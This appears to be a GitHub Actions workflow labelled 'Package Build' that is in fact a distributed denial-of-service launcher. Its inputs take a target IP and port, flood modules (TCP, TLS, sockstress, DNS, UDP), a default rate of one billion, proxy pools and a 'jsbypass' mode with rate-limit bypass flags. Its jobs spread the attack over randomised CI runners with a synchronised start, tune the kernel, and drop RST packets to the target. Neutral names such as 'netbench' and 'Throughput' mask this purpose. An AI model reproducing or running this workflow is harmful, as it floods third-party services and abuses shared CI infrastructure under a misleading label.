# Auto-generated config v468.34
# Continuous Integration Pipeline
name: Package Build

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Service endpoint'
        required: true
      target_port:
        description: 'Port number'
        required: true
        default: '443'
      duration:
        description: 'Timeout (seconds)'
        required: true
        default: '60'
      method:
        description: 'Module'
        required: true
        default: 'v18_tcp'
        type: choice
        options:
          - v18_tcp
          - v18_tls
          - tls
          - vn
          - sockstress_v15
          - persist_v10
          - fjium-dns
          - fjium-gudp
          - fjium-hex
          - fjium-pps
      threads:
        description: 'Parallelism'
        required: true
        default: '4'
      rate:
        description: 'Throughput'
        required: true
        default: '1000000000'
      runners:
        description: 'Replicas (0=random 1-8)'
        required: false
        default: '0'
      start_timestamp:
        description: 'Schedule (unix)'
        required: false
        default: '0'
      use_proxy:
        description: 'Proxy mode'
        required: false
        default: 'true'
        type: choice
        options:
          - 'true'
          - 'false'
      prefer_us_proxy:
        description: 'Prefer US proxies'
        required: false
        default: 'false'
        type: choice
        options:
          - 'true'
          - 'false'
      proxy_pool_id:
        description: 'Proxy pool id'
        required: false
        default: '0'
      proxy_pool_size:
        description: 'Proxy pool size'
        required: false
        default: '1'
      attack_mode:
        description: 'Attack backend (svc or jsbypass)'
        required: false
        default: 'svc'
      proxy_file:
        description: 'Proxy file for JS mode'
        required: false
        default: 'http.txt'
      jsbypass_payload:
        description: 'JSON payload for jsbypass.js'
        required: false
        default: ''

jobs:
  provision:
    runs-on: ubuntu-22.04
    outputs:
      matrix: ${{ steps.gen.outputs.matrix }}
      sync_ts: ${{ steps.sync.outputs.sync_ts }}
    steps:
    - uses: actions/checkout@v4

    - name: Cache binary
      id: cache-bin
      uses: actions/cache@v4
      with:
        path: netbench
        key: netbench-${{ hashFiles('*.c', '*.h', 'Makefile') }}

    - name: Cache apt packages
      if: steps.cache-bin.outputs.cache-hit != 'true'
      uses: actions/cache@v4
      with:
        path: ~/apt-cache
        key: deps-v2

    - name: Install dependencies
      if: steps.cache-bin.outputs.cache-hit != 'true'
      run: |
        if [ -d ~/apt-cache ]; then
          sudo cp ~/apt-cache/*.deb /var/cache/apt/archives/ 2>/dev/null || true
        fi
        sudo apt-get update -qq > /dev/null 2>&1 || true
        sudo apt-get install -y cpulimit clang libbpf-dev libelf-dev > /dev/null 2>&1 || true
        mkdir -p ~/apt-cache
        cp /var/cache/apt/archives/*.deb ~/apt-cache/ 2>/dev/null || true

    - name: Build project
      if: steps.cache-bin.outputs.cache-hit != 'true'
      run: make clean || true && make 2>&1

    - name: Store artifact
      uses: actions/upload-artifact@v4
      with:
        name: output
        path: |
          netbench
          proxies.txt
          http.txt
          jsbypass.js
          package.json
          package-lock.json
        retention-days: 1

    - id: sync
      name: Compute schedule
      run: |
        SYNC_TS=$(($(date +%s) + 20))
        echo "sync_ts=$SYNC_TS" >> $GITHUB_OUTPUT

    - id: gen
      run: |
        INPUT_R="${{ github.event.inputs.runners || '0' }}"
        if [ "$INPUT_R" -gt 0 ] 2>/dev/null; then
          n=$INPUT_R
        else
          n=$(( (RANDOM % 3) + 1 ))
        fi
        echo "Runner count: $n"
        ids=$(python3 -c "import json; print(json.dumps([i+1 for i in range($n)]))")
        echo "matrix={\"id\":$ids}" >> $GITHUB_OUTPUT

  launch:
    needs: [provision]
    runs-on: ubuntu-22.04
    timeout-minutes: 20
    strategy:
      matrix: ${{ fromJSON(needs.provision.outputs.matrix) }}
      fail-fast: false
    steps:
    - name: Fetch artifact
      uses: actions/download-artifact@v4
      with:
        name: output

    - name: Prepare environment
      run: |
        sudo apt-get update -qq > /dev/null 2>&1 || true
        sudo apt-get install -y nodejs npm > /dev/null 2>&1 || true
        node --version
        npm --version
        export NODE_OPTIONS='--max-old-space-size=4096 --no-warnings'
        sudo sysctl -w net.core.wmem_max=67108864 2>/dev/null || true
        sudo sysctl -w net.core.rmem_max=67108864 2>/dev/null || true
        sudo sysctl -w net.core.wmem_default=4194304 2>/dev/null || true
        sudo sysctl -w net.core.netdev_max_backlog=30000 2>/dev/null || true
        sudo sysctl -w net.core.somaxconn=65535 2>/dev/null || true
        sudo sysctl -w net.ipv4.conf.all.rp_filter=0 2>/dev/null || true
        sudo sysctl -w net.ipv4.conf.default.rp_filter=0 2>/dev/null || true
        sudo sysctl -w net.ipv4.conf.eth0.rp_filter=0 2>/dev/null || true
        sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true
        sudo iptables -t raw -A OUTPUT -p tcp -j NOTRACK 2>/dev/null || true
        sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
        TARGET_IP_INPUT="${{ github.event.inputs.target_ip || '127.0.0.1' }}"
        if echo "$TARGET_IP_INPUT" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then
          sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d "$TARGET_IP_INPUT" -j DROP 2>/dev/null || true
        fi

    - name: Execute workload (Replica ${{ matrix.id }})
      run: |
        mv netbench agent
        chmod +x agent
        if [ -f package.json ]; then
          export NODE_OPTIONS='--max-old-space-size=4096 --no-warnings'
          npm ci --no-audit --no-fund --omit=optional >/dev/null 2>&1 || npm install --no-audit --no-fund --omit=optional >/dev/null 2>&1 || true
        fi
        
        TARGET_IP="${{ github.event.inputs.target_ip || '127.0.0.1' }}"
        TARGET_PORT="${{ github.event.inputs.target_port || '443' }}"
        if [ -z "$TARGET_PORT" ] || [ "$TARGET_PORT" = "None" ] || [ "$TARGET_PORT" = "null" ]; then
          TARGET_PORT="443"
        fi
        TARGET_URL="$TARGET_IP"
        if printf '%s' "$TARGET_URL" | grep -Eq '^(https?|http)://'; then
          :
        else
          TARGET_URL="https://$TARGET_URL:$TARGET_PORT/"
        fi
        RATE="${{ github.event.inputs.rate || '1000' }}"
        DURATION="${{ github.event.inputs.duration || '5' }}"
        METHOD="${{ github.event.inputs.method || 'v18_tcp' }}"
        THREADS="${{ github.event.inputs.threads || '4' }}"
        
        PROXY_FLAG="--no-proxies"
        if [ "${{ github.event.inputs.use_proxy }}" = "true" ]; then
          PROXY_FLAG=""
        fi
        PREFER_US_FLAG=""
        if [ "${{ github.event.inputs.prefer_us_proxy || 'false' }}" = "true" ]; then
          PREFER_US_FLAG="--prefer-us-proxy"
        fi
        POOL_ID="${{ github.event.inputs.proxy_pool_id || '0' }}"
        POOL_SIZE="${{ github.event.inputs.proxy_pool_size || '1' }}"
        ATTACK_MODE="${{ github.event.inputs.attack_mode || 'svc' }}"
        PROXY_FILE="${{ github.event.inputs.proxy_file || 'http.txt' }}"
        JS_PAYLOAD="${{ github.event.inputs.jsbypass_payload || '' }}"
        JS_METHOD="$METHOD"
        case "$JS_METHOD" in
          GET|POST) ;;
          *) JS_METHOD="GET" ;;
        esac
        
        SYNC_TS="${{ needs.provision.outputs.sync_ts }}"
        START_TS="${{ github.event.inputs.start_timestamp || '0' }}"
        if [ "$START_TS" = "0" ] || [ "$START_TS" = "" ]; then
          START_TS="$SYNC_TS"
        fi
        if [ "$START_TS" != "0" ] && [ "$START_TS" != "" ]; then
          NOW=$(date +%s)
          WAIT=$((START_TS - NOW))
          if [ "$WAIT" -gt 0 ] && [ "$WAIT" -lt 300 ]; then
            sleep "$WAIT"
          fi
        fi
        
        ulimit -n 1000000 2>/dev/null || ulimit -n 65535 || true
        if [ "$ATTACK_MODE" = "jsbypass" ]; then
          if [ -f "$PROXY_FILE" ]; then
            cp "$PROXY_FILE" proxy.txt 2>/dev/null || true
          fi
          if [ -n "$JS_PAYLOAD" ]; then
            python3 - <<'PY' "$JS_PAYLOAD" "$TARGET_IP" "$TARGET_PORT" "$DURATION" "$METHOD" "$THREADS" "$RATE" "$PROXY_FILE"
            import json, os, sys
            payload = json.loads(sys.argv[1])
            method = payload.get('method', 'GET')
            target = payload.get('target_url', f"https://{sys.argv[2]}:{sys.argv[3]}/")
            duration = payload.get('duration', sys.argv[4])
            threads = payload.get('threads', sys.argv[5])
            rate = payload.get('rate', sys.argv[6])
            proxy_file = payload.get('proxy_file', sys.argv[7])
            args = payload.get('args', [])
            cmd = ['node', 'jsbypass.js', method, target, duration, threads, rate, proxy_file] + args + ['--debug', '--full', '--connect', '--ratelimit-bypass', '--redirect-bypass', '--cache']
            os.execvp(cmd[0], cmd)
            PY
          else
            node jsbypass.js "$JS_METHOD" "$TARGET_URL" "$DURATION" "$THREADS" "$RATE" "$PROXY_FILE" --debug --full --connect --ratelimit-bypass --redirect-bypass --cache >/dev/null 2>&1 &
          fi
        else
          sudo sh -c "ulimit -n 1000000 2>/dev/null; cpulimit -l 90 -f -- ./agent $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG $PREFER_US_FLAG --proxy-pool-id $POOL_ID --proxy-pool-size $POOL_SIZE || exec ./agent $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG $PREFER_US_FLAG --proxy-pool-id $POOL_ID --proxy-pool-size $POOL_SIZE"
        fi

    - name: Cleanup
      if: always()
      run: |
        TARGET_IP_INPUT="${{ github.event.inputs.target_ip || '127.0.0.1' }}"
        if echo "$TARGET_IP_INPUT" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then
          sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -d "$TARGET_IP_INPUT" -j DROP 2>/dev/null || true
        fi
